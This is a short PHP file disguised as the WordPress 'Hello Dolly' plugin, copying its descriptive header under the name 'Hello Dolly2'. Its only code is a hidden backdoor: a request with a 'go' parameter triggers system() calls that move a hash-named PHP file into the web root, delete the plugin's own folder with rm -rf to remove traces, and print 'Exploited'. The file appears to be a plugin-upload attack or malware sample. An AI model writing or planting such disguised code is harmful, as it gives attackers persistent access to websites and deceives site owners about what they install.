<?php
/*
Plugin Name:Hello Dolly2
Plugin URI: https://ma.tt/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from Hello, Dolly in the upper right of your admin screen on every page.
Version: Version 1.7.8
Author URI: https://ma.tt/
*/

if($_GET['go']) {
  system("mv 64fc9f8191afee3231e7197a27b8ee0c.php /var/www/html/64fc9f8191afee3231e7197a27b8ee0c.php");
  system("rm -rf /var/www/html/wp-content/plugins/Dolly2");
  echo "Exploited";
}
?>
